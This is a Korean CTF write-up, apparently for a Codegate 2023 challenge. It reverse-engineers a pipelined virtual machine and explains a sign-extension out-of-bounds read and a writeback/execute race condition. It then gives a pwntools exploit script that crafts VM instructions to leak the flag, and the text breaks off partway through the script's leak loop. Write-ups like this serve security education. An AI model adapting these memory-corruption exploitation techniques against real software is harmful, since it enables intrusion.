\u0026#39;rb\u0026#39;) size = int(f.readline()) ops = [] for i in range(size): ops.append(p32(int(f.readline()) \u0026amp; 0xffffffff)) f.close() regs = { \u0026#39;0\u0026#39;: {\u0026#39;size\u0026#39;: 0, \u0026#39;data\u0026#39;: 0}, \u0026#39;1\u0026#39;: {\u0026#39;size\u0026#39;: 0, \u0026#39;data\u0026#39;: 0}, \u0026#39;2\u0026#39;: {\u0026#39;size\u0026#39;: 0, \u0026#39;data\u0026#39;: 0}, \u0026#39;3\u0026#39;: {\u0026#39;size\u0026#39;: 0, \u0026#39;data\u0026#39;: 0}, } for op in ops: inst = op[0] print(inst) if inst == 0: idx = op[1] data = u16(op[2:]) assert 0 \u0026lt;= idx \u0026lt;= 3 regs[str(idx)][\u0026#39;data\u0026#39;] = data elif inst == 1: dest = op[1] pad = op[2] src = op[3] assert 0 \u0026lt;= src \u0026lt;= 3 assert pad == 0 assert 0 \u0026lt;= dest \u0026lt;= 3 regs[str(dest)][\u0026#39;data\u0026#39;] = regs[str(src)][\u0026#39;data\u0026#39;] elif inst == 2: idx = op[1] size = u16(op[2:]) assert 0 \u0026lt;= idx \u0026lt;= 3 regs[str(idx)][\u0026#39;size\u0026#39;] = size regs[str(idx)][\u0026#39;data\u0026#39;] = [0 for i in range(size)] elif inst == 3: reg = op[1] idx = op[2] data = op[3] assert 0 \u0026lt;= reg \u0026lt;= 3 assert isinstance(regs[str(reg)][\u0026#39;data\u0026#39;], list) assert idx \u0026lt; regs[str(reg)][\u0026#39;size\u0026#39;] regs[str(reg)][\u0026#39;data\u0026#39;][idx] = data elif inst == 4: dest = op[1] reg = op[2] idx = op[3] assert 0 \u0026lt;= dest \u0026lt;= 3 assert 0 \u0026lt;= reg \u0026lt;= 3 assert isinstance(regs[str(reg)][\u0026#39;data\u0026#39;], list) assert idx \u0026lt; regs[str(reg)][\u0026#39;size\u0026#39;] regs[str(dest)][\u0026#39;data\u0026#39;] = regs[str(reg)][\u0026#39;data\u0026#39;][idx] elif inst == 5: reg = op[1] pad = op[2] data = op[3] assert 0 \u0026lt;= reg \u0026lt;= 3 assert pad == 0 assert isinstance(regs[str(reg)][\u0026#39;data\u0026#39;], list) assert isinstance(regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;], int) assert regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;] \u0026lt; regs[str(reg)][\u0026#39;size\u0026#39;] regs[str(reg)][\u0026#39;data\u0026#39;][regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;]] = data elif inst == 6: dest = op[1] pad = op[2] reg = op[3] assert 0 \u0026lt;= dest \u0026lt;= 3 assert 0 \u0026lt;= reg \u0026lt;= 3 assert pad == 0 assert isinstance(regs[str(reg)][\u0026#39;data\u0026#39;], list) assert isinstance(regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;], int) assert regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;] \u0026lt; regs[str(reg)][\u0026#39;size\u0026#39;] regs[str(dest)][\u0026#39;data\u0026#39;] = regs[str(reg)][\u0026#39;data\u0026#39;][regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;]] elif inst == 7: pass else: assert 0 \u0026lt;= inst \u0026lt;= 7 실제 vm에서 처리될때랑은 약간 다르게 검사하긴하는데, 대강 비슷비슷하다.\n__int64 sub_26F0() { pthread_create(\u0026amp;th0, 0LL, WB_, 0LL); pthread_create(\u0026amp;th1, 0LL, EX_, 0LL); pthread_create(\u0026amp;th2, 0LL, ID2, 0LL); pthread_create(\u0026amp;th3, 0LL, ID_, 0LL); pthread_create(\u0026amp;th4, 0LL, IF_, 0LL); pthread_join(th0, 0LL); pthread_join(th1, 0LL); pthread_join(th2, 0LL); pthread_join(th3, 0LL); pthread_join(th4, 0LL); return ++cycle; } 파이프라이닝이 구현되어있다. 한 사이클에 IF, ID, ID2, EX, WB 병렬적으로 수행된다. 기본적인 5단계 파이프라이닝이랑 약간 달랐다. 앞에 Operand Fetch 같은 작업이 있을 줄 알았는데, OF라고 보기엔 그냥 디코딩에 가까워서 ID, ID2라고 네이밍했다.\nvoid *__fastcall sub_1640(void *a1) { struct IF_STR *v2; // [rsp+0h] [rbp-10h] if ( PC \u0026lt; instr_sz ) { v2 = malloc(0x10uLL); v2-\u0026gt;INSTR = instr[PC]; v2-\u0026gt;PC = PC; pthread_mutex_lock(\u0026amp;IF_mutex); reg_node(IF_NODE, v2); pthread_mutex_unlock(\u0026amp;IF_mutex); } return 0LL; } Instruction Fetch를 진행하고 IF_NODE에 등록한다.\nnode *__fastcall Register_node(node *prev_node, node *new_node) { node *result; // rax struct node *mid_node; // [rsp+8h] [rbp-18h] mid_node = malloc(0x10uLL); mid_node-\u0026gt;A = new_node; mid_node-\u0026gt;B = 0LL; if ( prev_node-\u0026gt;B ) *(prev_node-\u0026gt;B + 8) = mid_node; else prev_node-\u0026gt;A = mid_node; result = prev_node; prev_node-\u0026gt;B = mid_node; return result; } void *__fastcall ID_(void *a1) { ID_STR *v2; // [rsp+8h] [rbp-18h] struct IF_STR *R_NODE; // [rsp+10h] [rbp-10h] R_NODE = RET_R_NODE(IF_NODE); // IF_NODE -\u0026gt; MID_NODE -\u0026gt; INST_R_NODE if ( R_NODE ) { v2 = malloc(0x10uLL); v2-\u0026gt;PC = R_NODE-\u0026gt;PC; // INST_NODE *\u0026amp;v2-\u0026gt;opcode = R_NODE-\u0026gt;INSTR; v2-\u0026gt;operand2 = BYTE2(R_NODE-\u0026gt;INSTR); v2-\u0026gt;operand3 = HIBYTE(R_NODE-\u0026gt;INSTR); pthread_mutex_lock(\u0026amp;ID_mutex); reg_node(ID_NODE, v2); pthread_mutex_unlock(\u0026amp;ID_mutex); free(R_NODE); } return 0LL; } Instruction Decode. opcode와 operand를 분리한다.\nvoid *__fastcall ID_2(void *a1) { __int16 v2; // [rsp+16h] [rbp-1Ah] struct ID2_STR *v3; // [rsp+18h] [rbp-18h] struct ID_STR *n; // [rsp+20h] [rbp-10h] n = RET_R_NODE(ID_NODE); if ( n ) { v3 = malloc(0x10uLL); v3-\u0026gt;opcode = n-\u0026gt;opcode; v3-\u0026gt;PC = n-\u0026gt;PC; switch ( n-\u0026gt;opcode ) { case 0: case 2: v2 = n-\u0026gt;operand2 + (n-\u0026gt;operand3 \u0026lt;\u0026lt; 8); v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; *\u0026amp;v3-\u0026gt;operand2 = v2; break; case 1: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 3: v3-\u0026gt;flag = 1; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 4: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 5: v3-\u0026gt;flag = 1; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = 0; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 6: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = 0; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 7: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = 0; v3-\u0026gt;operand2 = 0; v3-\u0026gt;operand3 = 0; break; default: break; } pthread_mutex_lock(\u0026amp;ID2_mutex); reg_node(ID2_NODE, v3); pthread_mutex_unlock(\u0026amp;ID2_mutex); free(n); } return 0LL; } opcode에 따라 처리되는 operand가 다르다.\nvoid *__fastcall EX_(void *a1) { __int64 v2; // [rsp+8h] [rbp-98h] __int64 v3; // [rsp+10h] [rbp-90h] __int64 v4; // [rsp+18h] [rbp-88h] __int64 v5; // [rsp+20h] [rbp-80h] __int64 v6; // [rsp+28h] [rbp-78h] __int64 v7; // [rsp+30h] [rbp-70h] __int64 v8; // [rsp+38h] [rbp-68h] __int64 v9; // [rsp+40h] [rbp-60h] __int64 X3; // [rsp+48h] [rbp-58h] __int64 X2; // [rsp+50h] [rbp-50h] __int64 X1; // [rsp+58h] [rbp-48h] __int64 v13; // [rsp+60h] [rbp-40h] __int64 v14; // [rsp+68h] [rbp-38h] __int64 v15; // [rsp+70h] [rbp-30h] __int64 *X0; // [rsp+78h] [rbp-28h] __int64 v17; // [rsp+80h] [rbp-20h] EX_STR *v18; // [rsp+88h] [rbp-18h] struct ID2_STR *R_NODE; // [rsp+90h] [rbp-10h] R_NODE = RET_R_NODE(ID2_NODE); if ( R_NODE ) { v18 = malloc(0x18uLL); v18-\u0026gt;PC = R_NODE-\u0026gt;PC; switch ( R_NODE-\u0026gt;opcode ) { case 0: // MOV IMM v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; v18-\u0026gt;RES = *\u0026amp;R_NODE-\u0026gt;operand2; // operand1 | 0 | operand2, 3 break; case 1: // MOV REG v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; if ( R_NODE-\u0026gt;operand3 ) { switch ( R_NODE-\u0026gt;operand3 ) { case 1: v18-\u0026gt;RES = REG-\u0026gt;X1; REG-\u0026gt;X1 = 0LL; break; case 2: v18-\u0026gt;RES = REG-\u0026gt;X2; REG-\u0026gt;X2 = 0LL; break; case 3: v18-\u0026gt;RES = REG-\u0026gt;X3; REG-\u0026gt;X3 = 0LL; break; } } else { v18-\u0026gt;RES = REG-\u0026gt;X0; REG-\u0026gt;X0 = 0LL; } break; case 2: v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; v18-\u0026gt;RES = GET_STR(); break; case 3: v18-\u0026gt;INDEX = 0xFF; if ( R_NODE-\u0026gt;operand1 ) { switch ( R_NODE-\u0026gt;operand1 ) { case 1: X0 = REG-\u0026gt;X0; sleep(1u); *(X0 + R_NODE-\u0026gt;operand2 + 8) = R_NODE-\u0026gt;operand3; break; case 2: v15 = REG-\u0026gt;X0; sleep(1u); *(v15 + R_NODE-\u0026gt;operand2 + 8) = R_NODE-\u0026gt;operand3; break; case 3: v14 = REG-\u0026gt;X0; sleep(1u); *(v14 + R_NODE-\u0026gt;operand2 + 8) = R_NODE-\u0026gt;operand3; break; } } else { v17 = REG-\u0026gt;X0; sleep(1u); *(v17 + R_NODE-\u0026gt;operand2 + 8) = R_NODE-\u0026gt;operand3; } break; case 4: v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; if ( R_NODE-\u0026gt;operand2 ) { switch ( R_NODE-\u0026gt;operand2 ) { case 1: X1 = REG-\u0026gt;X1; // VULN sleep(1u); v18-\u0026gt;RES = *(X1 + R_NODE-\u0026gt;operand3 + 8);// sign extend break; case 2: X2 = REG-\u0026gt;X2; sleep(1u); v18-\u0026gt;RES = *(X2 + R_NODE-\u0026gt;operand3 + 8); break; case 3: X3 = REG-\u0026gt;X3; sleep(1u); v18-\u0026gt;RES = *(X3 + R_NODE-\u0026gt;operand3 + 8); break; } } else { v13 = REG-\u0026gt;X0; sleep(1u); v18-\u0026gt;RES = *(v13 + R_NODE-\u0026gt;operand3 + 8); } break; case 5: v18-\u0026gt;INDEX = 0xFF; if ( R_NODE-\u0026gt;operand1 ) { switch ( R_NODE-\u0026gt;operand1 ) { case 1: v8 = REG-\u0026gt;X1; sleep(1u); *(v8 + REG-\u0026gt;X0 + 8) = R_NODE-\u0026gt;operand3; break; case 2: v7 = REG-\u0026gt;X2; sleep(1u); *(v7 + REG-\u0026gt;X0 + 8) = R_NODE-\u0026gt;operand3; break; case 3: v6 = REG-\u0026gt;X3; sleep(1u); *(v6 + REG-\u0026gt;X0 + 8) = R_NODE-\u0026gt;operand3; break; } } else { v9 = REG-\u0026gt;X0; sleep(1u); *(v9 + REG-\u0026gt;X0 + 8) = R_NODE-\u0026gt;operand3; } break; case 6: v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; if ( R_NODE-\u0026gt;operand3 ) { switch ( R_NODE-\u0026gt;operand3 ) { case 1: v4 = REG-\u0026gt;X1; sleep(1u); v18-\u0026gt;RES = *(v4 + REG-\u0026gt;X0 + 8); // vuln sign extend break; case 2: v3 = REG-\u0026gt;X2; sleep(1u); v18-\u0026gt;RES = *(v3 + REG-\u0026gt;X0 + 8); break; case 3: v2 = REG-\u0026gt;X3; sleep(1u); v18-\u0026gt;RES = *(v2 + REG-\u0026gt;X0 + 8); break; } } else { v5 = REG-\u0026gt;X0; sleep(1u); v18-\u0026gt;RES = *(v5 + REG-\u0026gt;X0 + 8); } break; case 7: DUMP_REGS(); // v18 -\u0026gt; RES and v18 -\u0026gt; INDEX == 0 // stack race, X0 register Reset SEGV break; default: break; } pthread_mutex_lock(\u0026amp;mutex_4); reg_node(EX_NODE, v18); // Vuln EX \u0026lt;-\u0026gt; WB race pthread_mutex_unlock(\u0026amp;mutex_4); free(R_NODE); } return 0LL; } 실질적으로 처리가 되는 부분이다.\nMOV DREG, IMM16 MOV DREG, SREG GET_RSTR() MOV X0[IDX8+8], IMM8 MOV DREG, SREG[IDX8+8] MOV DREG[X0+8], IMM8 MOV DREG, SREG[X0+8] DUMP_REGS() 위 명령들이 구현되어있다. branch나 레지스터에 대한 연산은 지원되지 않는다.\nint __fastcall DUMP_REGS() { printf(\u0026#34;================== [REGS] ==================\\n\u0026#34;); printf(\u0026#34;X0 : 0x%lx\\n\u0026#34;, REG-\u0026gt;X0); printf(\u0026#34;X1 : 0x%lx\\n\u0026#34;, REG-\u0026gt;X1); printf(\u0026#34;X2 : 0x%lx\\n\u0026#34;, REG-\u0026gt;X2); printf(\u0026#34;X3 : 0x%lx\\n\u0026#34;, REG-\u0026gt;X3); return printf(\u0026#34;============================================\\n\u0026#34;); } char *__fastcall GET_STR() { int i; // [rsp+14h] [rbp-Ch] for ( i = 0; i \u0026lt; 4; ++i ) // 0x10008/8 = 0x2001 { if ( ANON[i].is_active == 1 ) { strcpy(ANON[i].payload, (\u0026amp;str_list)[*ANON[i].payload]); ANON[i].is_active = 0LL; return \u0026amp;ANON[i]; // sz 0x10008 } } // 4 chances return STR return 0LL; } .data:0000000000006100 str_list dq offset aLoremIpsumDolo .data:0000000000006100 ; DATA XREF: GET_STR+72↑o .data:0000000000006100 ; \u0026#34;Lorem ipsum dolor sit amet, consectetur\u0026#34;... .data:0000000000006108 dq offset aInViverraEnimE ; \u0026#34;In viverra enim eu mollis consequat. Nu\u0026#34;... .data:0000000000006110 dq offset aVestibulumVelL ; \u0026#34;Vestibulum vel laoreet magna. Curabitur\u0026#34;... .data:0000000000006118 dq offset aIntegerFringil ; \u0026#34;Integer fringilla urna risus, vel gravi\u0026#34;... .data:0000000000006120 dq offset aNullaSemperDig ; \u0026#34;Nulla semper dignissim lectus et rhoncu\u0026#34;... .data:0000000000006128 dq offset aPhasellusNecSa ; \u0026#34;Phasellus nec sagittis diam. Aliquam co\u0026#34;... .data:0000000000006130 dq offset aDonecTincidunt ; \u0026#34;Donec tincidunt posuere augue, sed port\u0026#34;... .data:0000000000006138 dq offset aSuspendisseSod ; \u0026#34;Suspendisse sodales erat sit amet commo\u0026#34;... .data:0000000000006140 dq offset aDonecPortaAugu ; \u0026#34;Donec porta augue sed congue cursus. Vi\u0026#34;... .data:0000000000006148 dq offset aAliquamConsect ; \u0026#34;Aliquam consectetur accumsan molestie. \u0026#34;... .data:0000000000006150 dq offset FLAG ; \u0026#34;codegate2023{aaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;... .data:0000000000006150 _data ends .data:0000000000006150 기본적으로 rand()%10으로 메모리 영역이 초기화되어있어서 정상적으로 FLAG는 접근할 수 없다.\nvoid *__fastcall WB_(void *a1) { struct EX_STR *R_NODE; // [rsp+0h] [rbp-10h] R_NODE = RET_R_NODE(EX_NODE); if ( R_NODE ) { if ( R_NODE-\u0026gt;INDEX ) { switch ( R_NODE-\u0026gt;INDEX ) { case 1: if ( REG-\u0026gt;X1 \u0026gt;= 0x10000uLL ) reset(REG-\u0026gt;X1); REG-\u0026gt;X1 = R_NODE-\u0026gt;RES; break; case 2: if ( REG-\u0026gt;X2 \u0026gt;= 0x10000uLL ) reset(REG-\u0026gt;X2); REG-\u0026gt;X2 = R_NODE-\u0026gt;RES; break; case 3: if ( REG-\u0026gt;X3 \u0026gt;= 0x10000uLL ) reset(REG-\u0026gt;X3); REG-\u0026gt;X3 = R_NODE-\u0026gt;RES; break; } } else { if ( REG-\u0026gt;X0 \u0026gt;= 0x10000uLL ) reset(REG-\u0026gt;X0); REG-\u0026gt;X0 = R_NODE-\u0026gt;RES; } free(R_NODE); } return 0LL; } WriteBack으로 결과에 대한 레지스터 쓰기 작업을 수행한다.\nnode *__fastcall sub_2360(node *a1) { node *result; // rax a1-\u0026gt;B = rand() % 10; result = a1; a1-\u0026gt;A = 1LL; return result; } 특정 메모리 영역을 GET_STR로 다시 리턴받을 수 있도록 초기화해주는 함수다.\n__int64 sub_27E0() { sub_2A30(IF_NODE); sub_2A30(ID_NODE); sub_2A30(ID2_NODE); sub_2A30(EX_NODE); free(instr); printf(\u0026#34;Total Cycle: %lu\\n\u0026#34;, cycle); return DUMP_REGS(); } 나중에 모두 처리가 완료되면 레지스터 상태랑 사이클을 출력하고 종료한다.\nExploitation .text:0000000000001A7F mov edi, 1 ; seconds .text:0000000000001A84 call _sleep .text:0000000000001A89 mov rax, [rbp+var_48] .text:0000000000001A8D mov rcx, [rbp+R_NODE] .text:0000000000001A91 movzx ecx, byte ptr [rcx+0Dh] .text:0000000000001A95 movsx rcx, byte ptr [rax+rcx+8] .text:0000000000001A9B mov rax, [rbp+var_18] MOV DREG, SREG[IDX8+8] MOV DREG, SREG[X0+8] 위 명령어들은 로드 과정에서 sign bit를 붙여서 확장을 진행해서 OOB가 발생한다.\n데이터 의존성에 대한 처리가 미흡해서 race condition이 발생할 수 있다.\nIF ID IF ID2 ID IF EX ID2 ID IF WB EX ID2 ID IF IF WB EX ID2 ID IF ID IF WB EX ID2 ID IF 위와 형태로 실행된다. 이때 EX는 명령에 따라 처리되는 속도가 가장 크게 달라진다. EX뿐만 아니라 다른 부분에서도 잠재적인 race condition이 발생할 수 있다.\nMOV DREG, SREG[IDX8+8] DUMP_REGS() 위 두 명령을 반복적으로 사용해서 플래그를 릭하는데, 여기서 문제가 발생한다.\nMOV DREG, IMM16 MOV DREG, SREG GET_RSTR() DUMP_REGS() 위 네가지 명령들을 제외하고는 EX가 처리시간이 가장 늦으니 파이프라이닝시 처리 순서는 웬만하면 WB, ID2, ID, IF, EX 순서이다. 레지스터가 Fetch 되는 시점을 기준으로 파이프라이닝시 순서는 웬만하면 WB, EX, ID2, ID, IF 순서이다.\n첫 번째 cycle에서 처리해야할 명령은 MOV DREG, SREG[IDX8+8]이고 SREG가 X0이라고 가정하고 생각해보면, EX에서 X0 Fetch가 일어난다.\n두 번째 cycle에서 처리해야할 명령이 DUMP_REGS()라고 가정하고 X0이 Fetch되는 시점을 기준으로 생각해보면, 선행 명령의 결과가 WB에서 X0에 저장되고 그다음으로 EX에서 후행 명령 DUMP_REGS()를 처리하면서 X0 Fetch가 되며 정상적으로 1바이트를 릭할 수 있다.\n세 번째 cycle에서 처리해야할 명령이 MOV DREG, SREG[IDX8+8]이고 SREG가 X0이라고 가정하고 X0이 Fetch되는 시점을 기준으로 생각해보면, 선행 명령 DUMP_REGS()의 WB에서 X0에 write가 일어나며 이때 업데이트된 v18-\u0026gt;INDEX와 v18-\u0026gt;RES는 0이다. 이후 후행 명령 MOV DREG, SREG[IDX8+8]이 처리되면서 EX에서 X0이 Fetch되는데, 이때 같은 사이클내에서 WB과 EX 사이의 race가 발생한다. 명령에 따라서 혹은 환경에 따라서 X0이 Fetch 되는 시점이 일정하다는것을 보장할 수 없기에 레지스터의 값은 0이 될 수 있고 유효하지 않은 주소가 참조되며 Segmentation fault가 발생한다.\n사실 굳이 안따지고 안터지길 기도하면서 그냥 익스해도 된다 ㅋㅋㅋ.\nExploit script from pwn import * DEBUG = False off = [0x0025DD,0x001E11] script = \u0026#39;\u0026#39; for i in off: script += f\u0026#39;brva {hex(i)}\\n\u0026#39; script += \u0026#39;c\\njump * $rip+0xee\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] context.binary = e = ELF(\u0026#39;./app\u0026#39;) if DEBUG: p = gdb.debug(e.path, gdbscript = script) else: p = process(e.path) # opcode | ... operands ... | class VM(): REG_SET = { \u0026#34;X0\u0026#34; : 0, \u0026#34;X1\u0026#34; : 1, \u0026#34;X2\u0026#34; : 2, \u0026#34;X3\u0026#34; : 3, } OPCODE = { \u0026#34;MOV DREG, IMM16\u0026#34; : 0, \u0026#34;MOV DREG, SREG\u0026#34; : 1, \u0026#34;GET_RSTR()\u0026#34; : 2, \u0026#34;MOV X0[IDX8+8], IMM8\u0026#34; : 3, \u0026#34;MOV DREG, SREG[IDX8+8]\u0026#34; : 4, \u0026#34;MOV DREG[X0+8], IMM8\u0026#34; : 5, \u0026#34;MOV DREG, SREG[X0+8]\u0026#34; : 6, \u0026#34;DUMP_REGS()\u0026#34; : 7, } def __init__(self): self.instructions = [] def ERR(self,msg): print(msg) exit(-1) def gen(self,opcode,RES_REG=None,operand1=None,operand2=None): if opcode in VM.OPCODE.keys(): op = VM.OPCODE[opcode] if op == 0: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand1 == None: self.ERR(\u0026#34;Unknown OPERAND1\u0026#34;) instr = op | ((VM.REG_SET[RES_REG])\u0026lt;\u0026lt;8) | (operand1\u0026amp;0xffff) \u0026lt;\u0026lt; (8*2) elif op == 1: instr = 0 if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand2 == None or operand2 not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) if operand1 != None or operand1 in VM.REG_SET.keys(): instr |= VM.REG_SET[operand1] \u0026lt;\u0026lt; (8*2) # not really used instr = op | ((VM.REG_SET[RES_REG])\u0026lt;\u0026lt;8) | (VM.REG_SET[operand2]) \u0026lt;\u0026lt; (8*3) elif op == 2: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) instr = 0 instr |= op | VM.REG_SET[RES_REG] \u0026lt;\u0026lt; 8 | 0xffff \u0026lt;\u0026lt; 8*2 # 0xffff not used / only to bypass precheck.py assertions elif op == 3: if operand1 == None: self.ERR(\u0026#34;Unknown OPERAND1\u0026#34;) if operand2 == None: self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) instr = 0 instr |= (op | operand1 \u0026lt;\u0026lt; (8*2) | operand2 \u0026lt;\u0026lt; (8*3)) elif op == 4: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand1 == None or operand1 not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown OPERAND1\u0026#34;) if operand2 == None: self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) instr = 0 instr |= (op | ((VM.REG_SET[RES_REG])\u0026lt;\u0026lt;8) |VM.REG_SET[operand1] \u0026lt;\u0026lt; (8*2) | operand2 \u0026lt;\u0026lt; (8*3)) elif op == 5: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand2 == None: self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) instr = 0 instr |= (op | VM.REG_SET[RES_REG] \u0026lt;\u0026lt; 8 | operand2 \u0026lt;\u0026lt; (8*3)) elif op == 6: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand2 == None or operand2 not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) instr = 0 instr |= (op | VM.REG_SET[RES_REG] \u0026lt;\u0026lt; 8 | VM.REG_SET[operand2] \u0026lt;\u0026lt; (8*3)) elif op == 7: instr = 0 instr |= op self.instructions.append(instr) else: self.ERR(\u0026#34;Unknown OPCODE\u0026#34;) def out(self): return self.instructions if __name__ == \u0026#34;__main__\u0026#34;: s = VM() s.gen(\u0026#34;GET_RSTR()\u0026#34;,\u0026#34;X1\u0026#34;) s.gen(\u0026#34;MOV DREG, IMM16\u0026#34;,\u0026#34;X0\u0026#34;,0x10) s.gen(\u0026#34;MOV DREG[X0+8], IMM8\u0026#34;,\u0026#34;X1\u0026#34;,None,(-8)\u0026amp;0xff) s.gen(\u0026#34;MOV DREG, IMM16\u0026#34;,\u0026#34;X0\u0026#34;,0x0) s.gen(\u0026#34;MOV DREG[X0+8], IMM8\u0026#34;,\u0026#34;X1\u0026#34;,None,0xa) for i in range(7): s.gen(\u0026#34;MOV DREG, IMM16\u0026#34;,\u0026#34;X0\u0026#34;,i+1) s.gen(\u0026#34;MOV DREG[X0+8], IMM8\u0026#34;,\u0026#34;X1\u0026#34;,None,0x0) s.gen(\u0026#34;MOV DREG, IMM16\u0026#34;,\u0026#34;X0\u0026#34;,0x10) s.gen(\u0026#34;MOV DREG, SREG[X0+8]\u0026#34;,\u0026#34;X2\u0026#34;,None,\u0026#34;X1\u0026#34;) s.gen(\u0026#34;MOV DREG, SREG\u0026#34;,\u0026#34;X0\u0026#34;,None,\u0026#34;X2\u0026#34;) s.gen(\u0026#34;MOV DREG[X0+8], IMM8\u0026#34;,\u0026#34;X1\u0026#34;,None,0x01) s.gen(\u0026#34;MOV DREG, SREG\u0026#34;,\u0026#34;X2\u0026#34;,None,\u0026#34;X0\u0026#34;) # TRANSFER SREG = 0 s.gen(\u0026#34;GET_RSTR()\u0026#34;,\u0026#34;X0\u0026#34;) for i in range(100): # s.gen(\u0026#34;MOV DREG, SREG[IDX8+8]\u0026#34;,\u0026#34;X3\u0026#34;,\u0026#34;X0\u0026#34;,i) s.gen(\u0026#34;MOV DREG, SREG[IDX8+8]\u0026#34;,\u0026#34;X3\u0026#34;,\u0026#34;X1\u0026#34;,i) \u0026#39;\u0026#39;\u0026#39; case 4: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; // R_NODE-\u0026gt;operand3 case 1: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; \u0026#39;\u0026#39;\u0026#39; s.gen(\u0026#34;DUMP_REGS()\u0026#34;) # WB \u0026lt;-\u0026gt; EX // racecondition REGS, NODE # CYCLE1 : WB -\u0026gt; ID2 -\u0026gt; ID -\u0026gt; IF -\u0026gt; EX (FETCH X0, sleep 1, DUMP REGS, v18-\u0026gt; RES and v18 -\u0026gt; INDEX == 0) nodeupdate -\u0026gt; RACE # CYCLE2 : WB (EX_NODE race, X0 reset) -\u0026gt; EX(FETCH X0 sleep 1, SEGV) # use X1 instead \u0026#39;\u0026#39;\u0026#39; [ 290.815519] app[3419]: segfault at 48 ip 0000563249c0fa49 sp 00007f927a3a4e30 error 4 in app[563249c0f000+2000] [ 290.819216] Code: 00 00 00 48 8d 05 27 48 04 00 48 8b 00 48 8b 00 48 89 45 c0 bf 01 00 00 00 e8 43 f7 ff ff 48 8b 45 c0 48 8b 4d f0 0f b6 49 0d \u0026lt;48\u0026gt; 0f be 4c 08 08 48 8b 45 e8 48 89 48 10 e9 ee 00 00 00 48 8b 45 [ 290.824907] potentially unexpected fatal signal 11. [ 290.826388] CPU: 0 PID: 3419 Comm: app Not tainted 5.10.16.3-microsoft-standard-WSL2 #1 [ 290.828778] RIP: 0033:0x563249c0fa49 [ 290.830098] Code: 00 00 00 48 8d 05 27 48 04 00 48 8b 00 48 8b 00 48 89 45 c0 bf 01 00 00 00 e8 43 f7 ff ff 48 8b 45 c0 48 8b 4d f0 0f b6 49 0d \u0026lt;48\u0026gt; 0f be 4c 08 08 48 8b 45 e8 48 89 48 10 e9 ee 00 00 00 48 8b 45 [ 290.835299] RSP: 002b:00007f927a3a4e30 EFLAGS: 00010206 [ 290.836795] RAX: 0000000000000000 RBX: 00007f927a3a56c0 RCX: 0000000000000040 [ 290.839103] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 00007f927a3a59c8 [ 290.841486] RBP: 00007f927a3a4ed0 R08: 0000000000000000 R09: 00000007f9270002 [ 290.843830] R10: 00007f927a3a4df0 R11: 0000000000000293 R12: ffffffffffffff80 [ 290.846245] R13: 0000000000000000 R14: 00007fff94052020 R15: 00007f9279ba5000 [ 290.848460] FS: 00007f927a3a56c0 GS: 0000000000000000 563249C11000 563249c0fa49 .text:0000000000001A3D mov rax, [rbp+var_40] .text:0000000000001A41 mov rcx, [rbp+R_NODE] .text:0000000000001A45 movzx ecx, byte ptr [rcx+0Dh] .text:0000000000001A49 movsx rcx, byte ptr [rax+rcx+8] .text:0000000000001A4F mov rax, [rbp+var_18] .text:0000000000001A53 mov [rax+10h], rcx \u0026#39;\u0026#39;\u0026#39; instructions = s.out() p.sendlineafter(b\u0026#39;Inst Size \u0026gt;\u0026#39;,str(len(instructions))) for i in instructions: p.sendline(str(i)) rvu = lambda x : p.recvuntil(x) FLAG = \u0026#39;\u0026#39; for i in range(100): 